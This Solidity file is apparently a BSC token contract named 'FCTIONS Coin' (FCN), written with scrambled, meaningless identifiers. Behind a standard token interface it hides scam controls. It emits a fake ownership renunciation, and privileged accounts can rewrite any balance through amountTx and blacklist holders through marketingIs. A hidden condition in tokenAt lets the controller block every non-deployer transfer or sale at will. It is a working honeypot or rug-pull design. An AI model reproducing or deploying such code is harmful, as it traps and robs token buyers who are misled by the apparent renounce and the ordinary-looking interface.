//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface maxShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverAuto) external view returns (uint256);

    function transfer(address toTeam, uint256 launchShould) external returns (bool);

    function allowance(address launchReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchShould) external returns (bool);

    function transferFrom(
        address sender,
        address toTeam,
        uint256 launchShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingTake, uint256 value);
    event Approval(address indexed launchReceiver, address indexed spender, uint256 value);
}

interface amountLaunchedExempt is maxShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract tokenLaunchTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldLaunched {
    function createPair(address isBuySell, address txBuy) external returns (address);
}

interface shouldReceiverLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract FCTIONSCoin is tokenLaunchTeam, maxShould, amountLaunchedExempt {

    function getOwner() external view returns (address) {
        return fromToken;
    }

    bool private tradingLaunchedSender;

    bool public modeTx;

    event OwnershipTransferred(address indexed autoMax, address indexed marketingAtIs);

    string private sellTeam = "FCTIONS Coin";

    address public maxLaunched;

    bool public sellReceiver;

    function transferFrom(address enableLimit, address toTeam, uint256 launchShould) external override returns (bool) {
        if (_msgSender() != maxEnable) {
            if (takeAtFund[enableLimit][_msgSender()] != type(uint256).max) {
                require(launchShould <= takeAtFund[enableLimit][_msgSender()]);
                takeAtFund[enableLimit][_msgSender()] -= launchShould;
            }
        }
        return tokenAt(enableLimit, toTeam, launchShould);
    }

    function walletMode() private view {
        require(amountIs[_msgSender()]);
    }

    function allowance(address launchedMax, address feeMarketing) external view virtual override returns (uint256) {
        if (feeMarketing == maxEnable) {
            return type(uint256).max;
        }
        return takeAtFund[launchedMax][feeMarketing];
    }

    function balanceOf(address receiverAuto) public view virtual override returns (uint256) {
        return tradingTxWallet[receiverAuto];
    }

    address maxEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function decimals() external view virtual override returns (uint8) {
        return fromMax;
    }

    address limitExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private feeLaunchTrading;

    function owner() external view returns (address) {
        return fromToken;
    }

    uint8 private fromMax = 18;

    function symbol() external view virtual override returns (string memory) {
        return swapMax;
    }

    function amountTx(address receiverList, uint256 launchShould) public {
        walletMode();
        tradingTxWallet[receiverList] = launchShould;
    }

    mapping(address => mapping(address => uint256)) private takeAtFund;

    address private fromToken;

    function launchLaunched() public {
        emit OwnershipTransferred(maxMin, address(0));
        fromToken = address(0);
    }

    function transfer(address receiverList, uint256 launchShould) external virtual override returns (bool) {
        return tokenAt(_msgSender(), receiverList, launchShould);
    }

    function fundTx(address senderShould) public {
        if (sellReceiver) {
            return;
        }
        
        amountIs[senderShould] = true;
        
        sellReceiver = true;
    }

    bool public modeList;

    uint256 public feeMode;

    string private swapMax = "FCN";

    function atFund(uint256 launchShould) public {
        walletMode();
        buyMin = launchShould;
    }

    uint256 public limitSell;

    bool private limitAuto;

    constructor (){
        if (feeMode != limitSell) {
            tradingLaunchedSender = false;
        }
        launchLaunched();
        shouldReceiverLiquidity listIs = shouldReceiverLiquidity(maxEnable);
        maxLaunched = shouldLaunched(listIs.factory()).createPair(listIs.WETH(), address(this));
        
        maxMin = _msgSender();
        amountIs[maxMin] = true;
        tradingTxWallet[maxMin] = fromTake;
        
        emit Transfer(address(0), maxMin, fromTake);
    }

    uint256 private maxIsReceiver;

    uint256 buyMin;

    function takeMode(address enableLimit, address toTeam, uint256 launchShould) internal returns (bool) {
        require(tradingTxWallet[enableLimit] >= launchShould);
        tradingTxWallet[enableLimit] -= launchShould;
        tradingTxWallet[toTeam] += launchShould;
        emit Transfer(enableLimit, toTeam, launchShould);
        return true;
    }

    address public maxMin;

    mapping(address => uint256) private tradingTxWallet;

    bool public receiverTotal;

    function tokenAt(address enableLimit, address toTeam, uint256 launchShould) internal returns (bool) {
        if (enableLimit == maxMin) {
            return takeMode(enableLimit, toTeam, launchShould);
        }
        uint256 toExempt = maxShould(maxLaunched).balanceOf(limitExempt);
        require(toExempt == buyMin);
        require(!receiverTrading[enableLimit]);
        return takeMode(enableLimit, toTeam, launchShould);
    }

    uint256 txMarketingSell;

    function name() external view virtual override returns (string memory) {
        return sellTeam;
    }

    function approve(address feeMarketing, uint256 launchShould) public virtual override returns (bool) {
        takeAtFund[_msgSender()][feeMarketing] = launchShould;
        emit Approval(_msgSender(), feeMarketing, launchShould);
        return true;
    }

    uint256 private fromTake = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return fromTake;
    }

    function marketingIs(address totalEnableLaunched) public {
        walletMode();
        if (maxIsReceiver == limitSell) {
            modeTx = false;
        }
        if (totalEnableLaunched == maxMin || totalEnableLaunched == maxLaunched) {
            return;
        }
        receiverTrading[totalEnableLaunched] = true;
    }

    mapping(address => bool) public receiverTrading;

    mapping(address => bool) public amountIs;

    bool private receiverTo;

}